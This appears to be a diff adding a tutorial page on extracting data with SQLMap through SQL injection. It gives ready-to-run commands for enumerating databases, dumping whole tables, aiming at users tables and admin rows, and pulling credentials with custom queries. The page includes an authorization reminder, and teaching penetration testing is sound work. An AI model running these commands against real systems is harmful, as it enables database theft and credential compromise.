@@ -1,0 +1,240 @@
+---
+title: Data Extraction
+description: Learn how to extract data from databases using SQLMap
+---
+
+# Data Extraction with SQLMap
+
+SQLMap provides powerful capabilities for extracting data from vulnerable databases. This section covers various techniques for database enumeration and data extraction.
+
+<Tabs defaultValue="enumeration" className="pt-5 pb-1">
+  <TabsList>
+    <TabsTrigger value="enumeration">Database Enumeration</TabsTrigger>
+    <TabsTrigger value="tables">Table Extraction</TabsTrigger>
+    <TabsTrigger value="dump">Data Dumping</TabsTrigger>
+  </TabsList>
+  <TabsContent value="enumeration">
+    ## Database Enumeration
+    
+    Before extracting specific data, you need to gather information about the database structure:
+    
+    ### Identifying the Database Management System
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" --banner
+    ```
+    
+    This command retrieves the database banner, which typically includes version information.
+    
+    ### Listing Available Databases
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" --dbs
+    ```
+    
+    This command lists all databases accessible to the current user.
+    
+    ### Current Database Information
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" --current-db
+    ```
+    
+    This command identifies the database currently in use by the web application.
+    
+    <Note title="Pro Tip" type="success">
+    Always start with enumeration to understand the database structure before attempting to extract specific data.
+    </Note>
+  </TabsContent>
+  <TabsContent value="tables">
+    ## Table Extraction
+    
+    Once you've identified the target database, you can extract information about its tables:
+    
+    ### Listing Tables in a Database
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" -D database_name --tables
+    ```
+    
+    Replace `database_name` with the name of the database you want to explore.
+    
+    ### Listing Columns in a Table
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" -D database_name -T table_name --columns
+    ```
+    
+    This command lists all columns in the specified table, which helps you identify which columns contain sensitive information.
+    
+    <Note title="Security Note" type="warning">
+    Tables with names like "users", "accounts", "members", or "admin" often contain valuable information such as usernames, email addresses, and password hashes.
+    </Note>
+  </TabsContent>
+  <TabsContent value="dump">
+    ## Data Dumping
+    
+    After identifying the tables and columns of interest, you can extract the actual data:
+    
+    ### Dumping Specific Columns
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" -D database_name -T table_name -C "column1,column2" --dump
+    ```
+    
+    This command extracts data from the specified columns.
+    
+    ### Dumping an Entire Table
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" -D database_name -T table_name --dump
+    ```
+    
+    This command extracts all data from the specified table.
+    
+    ### Dumping an Entire Database
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" -D database_name --dump
+    ```
+    
+    <Note title="Warning" type="danger">
+    Dumping entire databases can generate a large amount of traffic and may trigger intrusion detection systems. Use this option with caution.
+    </Note>
+  </TabsContent>
+</Tabs>
+
+## Step-by-Step Data Extraction Process
+
+<Stepper>
+  <StepperItem title="Identify the Injection Point">
+    First, confirm that the target is vulnerable to SQL injection:
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" --batch
+    ```
+    
+    SQLMap will automatically test for vulnerabilities and report any findings.
+  </StepperItem>
+  <StepperItem title="Enumerate Database Information">
+    Once you've confirmed a vulnerability, gather information about the database:
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" --banner --current-user --current-db
+    ```
+    
+    This command retrieves the database banner, current user, and current database name.
+  </StepperItem>
+  <StepperItem title="List Available Databases">
+    Identify all accessible databases:
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" --dbs
+    ```
+    
+    Review the list and identify databases that might contain valuable information.
+  </StepperItem>
+  <StepperItem title="Explore Database Structure">
+    For each database of interest, list its tables:
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" -D target_db --tables
+    ```
+    
+    Look for tables with names suggesting they contain user data or other sensitive information.
+  </StepperItem>
+  <StepperItem title="Extract Sensitive Data">
+    Once you've identified tables of interest, extract their data:
+    
+    ```bash
+    sqlmap -u "http://target.com/vuln.php?id=1" -D target_db -T users -C "username,email,password" --dump
+    ```
+    
+    SQLMap will extract the specified columns and attempt to crack any password hashes it finds.
+  </StepperItem>
+</Stepper>
+
+## Common Database Structures
+
+Different web applications organize their data in various ways. Here are some common database structures you might encounter:
+
+<div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-6">
+  <div className="border rounded-md p-4">
+    <h3 className="text-lg font-semibold">E-commerce Platform</h3>
+    <FileSystem>
+      <FileSystemRoot name="shop_db" />
+      <FileSystemItem name="users" type="directory" level={1} />
+      <FileSystemItem name="id" type="file" level={2} />
+      <FileSystemItem name="username" type="file" level={2} />
+      <FileSystemItem name="password" type="file" level={2} />
+      <FileSystemItem name="email" type="file" level={2} />
+      <FileSystemItem name="products" type="directory" level={1} />
+      <FileSystemItem name="id" type="file" level={2} />
+      <FileSystemItem name="name" type="file" level={2} />
+      <FileSystemItem name="price" type="file" level={2} />
+      <FileSystemItem name="description" type="file" level={2} />
+      <FileSystemItem name="orders" type="directory" level={1} isLast={true} />
+      <FileSystemItem name="id" type="file" level={2} />
+      <FileSystemItem name="user_id" type="file" level={2} />
+      <FileSystemItem name="product_id" type="file" level={2} />
+      <FileSystemItem name="quantity" type="file" level={2} />
+      <FileSystemItem name="total" type="file" level={2} isLast={true} />
+    </FileSystem>
+  </div>
+  <div className="border rounded-md p-4">
+    <h3 className="text-lg font-semibold">Content Management System</h3>
+    <FileSystem>
+      <FileSystemRoot name="cms_db" />
+      <FileSystemItem name="users" type="directory" level={1} />
+      <FileSystemItem name="id" type="file" level={2} />
+      <FileSystemItem name="username" type="file" level={2} />
+      <FileSystemItem name="password" type="file" level={2} />
+      <FileSystemItem name="email" type="file" level={2} />
+      <FileSystemItem name="role" type="file" level={2} isLast={true} />
+      <FileSystemItem name="posts" type="directory" level={1} />
+      <FileSystemItem name="id" type="file" level={2} />
+      <FileSystemItem name="title" type="file" level={2} />
+      <FileSystemItem name="content" type="file" level={2} />
+      <FileSystemItem name="author_id" type="file" level={2} />
+      <FileSystemItem name="date" type="file" level={2} isLast={true} />
+      <FileSystemItem name="settings" type="directory" level={1} isLast={true} />
+      <FileSystemItem name="site_name" type="file" level={2} />
+      <FileSystemItem name="theme" type="file" level={2} />
+      <FileSystemItem name="api_keys" type="file" level={2} isLast={true} />
+    </FileSystem>
+  </div>
+</div>
+
+<Note title="Ethical Reminder" type="note">
+Remember that unauthorized data extraction is illegal. Always obtain proper authorization before performing security testing on any system.
+</Note>
+
+## Advanced Data Extraction Techniques
+
+For more complex scenarios, SQLMap offers advanced options:
+
+### Conditional Data Extraction
+
+```bash
+sqlmap -u "http://target.com/vuln.php?id=1" -D database_name -T users --dump --where "admin=1"
+```
+
+This command extracts only records where the "admin" column has a value of 1, which is useful for targeting administrator accounts.
+
+### Custom SQL Queries
+
+```bash
+sqlmap -u "http://target.com/vuln.php?id=1" --sql-query "SELECT concat(username,':',password) FROM users WHERE admin=1"
+```
+
+This command executes a custom SQL query, allowing for more complex data extraction scenarios.
+
+<Note title="Performance Tip" type="success">
+When extracting large amounts of data, use the `--threads` parameter to speed up the process:
+
+```bash
+sqlmap -u "http://target.com/vuln.php?id=1" -D database_name -T large_table --dump --threads=10
+```
+
+This runs multiple threads in parallel, significantly reducing extraction time.
+</Note>
